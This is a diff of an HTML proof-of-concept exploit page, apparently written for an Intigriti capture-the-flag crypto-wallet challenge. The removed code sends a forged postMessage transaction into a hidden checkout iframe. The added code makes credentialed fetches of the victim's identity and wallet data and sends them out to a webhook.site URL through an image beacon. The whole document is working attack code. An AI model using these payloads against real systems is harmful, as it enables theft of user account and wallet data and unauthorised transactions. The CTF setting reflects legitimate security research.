@@ -3,42 +3,40 @@
 <body>
 <script>
 /*
-  Phase 1 – definitive transaction test
-  - No DOM access
-  - No UI simulation
-  - Only postMessage
-  - Long delay to ensure wallets are loaded
+  Diagnostic PoC
+  Goal: Verify admin authentication + wallet contents
 */
 
-const ADDRESS = "114a580aae95817f9bf8d3704eb6e69417";
 const WEBHOOK = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";
 
-// Load checkout page as admin
-const iframe = document.createElement("iframe");
-iframe.style.display = "none";
-iframe.src =
-  "https://challenge-0126.intigriti.io/checkout.html" +
-  "?currency=1337COIN&price=1337";
+(async () => {
+  try {
+    // 1️⃣ Check identity
+    const me = await fetch(
+      "https://challenge-0126.intigriti.io/api/me",
+      { credentials: "include" }
+    ).then(r => r.json());
 
-document.body.appendChild(iframe);
+    // 2️⃣ Fetch wallets
+    const wallets = await fetch(
+      "https://challenge-0126.intigriti.io/api/wallets",
+      { credentials: "include" }
+    ).then(r => r.json());
 
-// Wait 60 seconds for full initialization
-setTimeout(() => {
-  // Send the vulnerable message
-  iframe.contentWindow.postMessage({
-    type: "submitTransaction",
-    transaction: {
-      toAddress: ADDRESS,
-      currency: "1337COIN",
-      amount: 1
-    }
-  }, "*");
+    // 3️⃣ Send everything to webhook
+    new Image().src =
+      WEBHOOK +
+      "?stage=wallet_dump" +
+      "&user=" + encodeURIComponent(JSON.stringify(me)) +
+      "&wallets=" + encodeURIComponent(JSON.stringify(wallets));
 
-  // Beacon for confirmation
-  new Image().src =
-    WEBHOOK + "?step=postmessage_sent&ts=" + Date.now();
-
-}, 60000);
+  } catch (e) {
+    new Image().src =
+      WEBHOOK +
+      "?stage=error&msg=" +
+      encodeURIComponent(e.toString());
+  }
+})();
 </script>
 </body>
 </html>
